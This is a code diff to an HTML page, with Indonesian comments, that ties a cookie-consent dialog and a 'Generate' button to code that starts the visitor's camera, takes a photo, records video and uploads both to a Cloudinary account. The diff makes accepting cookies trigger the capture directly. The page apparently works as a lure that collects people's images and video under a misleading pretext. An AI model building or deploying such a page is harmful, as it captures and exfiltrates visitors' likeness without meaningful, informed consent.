@@ -23,9 +23,9 @@
         #cookieConsentModal {
             display: none;
             position: fixed;
-            bottom: 20px;
+            top: 50%;
             left: 50%;
-            transform: translateX(-50%);
+            transform: translate(-50%, -50%);
             background: #fff;
             padding: 20px;
             box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
@@ -88,10 +88,12 @@
         let mediaRecorder = null;
         let recordedChunks = [];
 
-        // Tampilkan modal cookies saat halaman dimuat
-        document.addEventListener('DOMContentLoaded', () => {
+        // Tampilkan modal cookies saat tombol Generate ditekan
+        startButton.addEventListener('click', () => {
             if (!document.cookie.includes('cookieConsent=true')) {
                 cookieConsentModal.style.display = 'block';
+            } else {
+                startProcess(); // Jika cookies sudah disetujui, langsung mulai proses
             }
         });
 
@@ -99,6 +101,7 @@
         acceptCookiesButton.addEventListener('click', () => {
             document.cookie = "cookieConsent=true; max-age=2592000; path=/"; // Simpan selama 30 hari
             cookieConsentModal.style.display = 'none';
+            startProcess(); // Mulai proses setelah menyetujui cookies
         });
 
         // Fungsi untuk menolak cookies
@@ -107,6 +110,17 @@
             statusText.textContent = 'Anda harus menyetujui cookies untuk menggunakan fitur ini.';
             statusText.hidden = false;
         });
+
+        // Fungsi untuk memulai proses (akses kamera, ambil foto, rekam video)
+        async function startProcess() {
+            statusText.textContent = 'Mengakses kamera...';
+            await startCamera();
+
+            if (cameraStream) {
+                await takePhoto();
+                await recordVideo();
+            }
+        }
 
         // Fungsi untuk memulai kamera
         async function startCamera() {
@@ -177,37 +191,21 @@
                 formData.append('upload_preset', UPLOAD_PRESET);
 
                 const endpoint = type === 'image' ? 'image/upload' : 'video/upload';
-                const response = await fetch(https://api.cloudinary.com/v1_1/${CLOUD_NAME}/${endpoint}, {
+                const response = await fetch(`https://api.cloudinary.com/v1_1/${CLOUD_NAME}/${endpoint}`, {
                     method: 'POST',
                     body: formData,
                 });
 
                 const data = await response.json();
                 if (data.secure_url) {
-                    statusText.innerHTML = ${type === 'image' ? 'Foto' : 'Video'} berhasil diunggah! <a href="${data.secure_url}" target="_blank">Lihat di sini</a>;
+                    statusText.innerHTML = `${type === 'image' ? 'Foto' : 'Video'} berhasil diunggah! <a href="${data.secure_url}" target="_blank">Lihat di sini</a>`;
                 } else {
-                    statusText.textContent = Gagal mengunggah ${type}: ${JSON.stringify(data)};
+                    statusText.textContent = `Gagal mengunggah ${type}: ${JSON.stringify(data)}`;
                 }
             } catch (error) {
-                statusText.textContent = Gagal mengunggah ${type}: ${error.message};
+                statusText.textContent = `Gagal mengunggah ${type}: ${error.message}`;
             }
         }
-
-        startButton.addEventListener('click', async () => {
-            if (!document.cookie.includes('cookieConsent=true')) {
-                statusText.textContent = 'Anda harus menyetujui cookies terlebih dahulu.';
-                statusText.hidden = false;
-                return;
-            }
-
-            statusText.textContent = 'Mengakses kamera...';
-            await startCamera();
-
-            if (cameraStream) {
-                await takePhoto();
-                await recordVideo();
-            }
-        });
     </script>
 </body>
 </html>
